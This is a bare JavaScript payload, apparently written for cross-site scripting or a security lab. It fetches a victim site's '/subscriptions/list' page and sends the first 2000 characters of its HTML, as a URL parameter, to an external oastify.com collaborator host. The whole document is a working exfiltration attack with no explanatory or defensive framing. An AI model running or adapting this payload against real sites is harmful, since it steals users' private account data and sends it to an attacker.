fetch('/subscriptions/list')
  .then(r => r.text())
  .then(html => {
    location.href = 'https://659mhh6waaofjuswyin7nbdbj2ptdk19.oastify.com/?data=' + encodeURIComponent(html.substring(0, 2000));
  });
